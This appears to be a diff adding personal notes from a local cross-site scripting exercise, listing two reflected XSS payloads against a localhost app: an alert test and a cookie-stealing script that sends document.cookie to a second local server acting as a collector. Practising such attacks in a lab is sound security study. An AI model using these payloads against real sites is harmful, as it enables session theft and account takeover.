@@ -1,0 +1,4 @@
+1. Simple alert -> http://localhost:5678/?name=%3Cscript%3Ealert(%27hello%20world%27)%3C/script%3E
+2. Cookie stealing
+  I have another server at http://localhost:3000/ it reads a query param cookies and returns an image.
+  http://localhost:5678?name=<script>document.write('<img src="http://localhost:3000?cookies="'+ document.cookie +' />')</script>
